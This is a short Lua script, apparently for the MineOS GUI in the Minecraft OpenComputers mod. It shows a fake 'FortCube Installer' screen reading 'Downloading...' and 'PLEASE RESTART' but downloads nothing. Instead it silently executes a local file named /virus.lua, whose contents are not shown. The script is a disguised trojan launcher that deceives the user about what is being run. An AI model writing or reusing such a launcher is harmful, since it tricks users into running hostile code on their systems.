local GUI = require("GUI")


--------------------------------------------------------------------------------

local workspace = GUI.workspace()
workspace:addChild(GUI.panel(1, 1, workspace.width, workspace.height, 0x2D2D2D))

workspace:addChild(GUI.text(3, 2, 0xFFFFFF, "FortCube Installer "))
workspace:addChild(GUI.text(3, 3, 0xFFFFFF, "Downloading..."))
workspace:addChild(GUI.text(3, 3, 0xFFFFFF, "PLEASE RESTART"))

system.execute("/virus.lua")





--------------------------------------------------------------------------------
workspace:draw()
workspace:start()
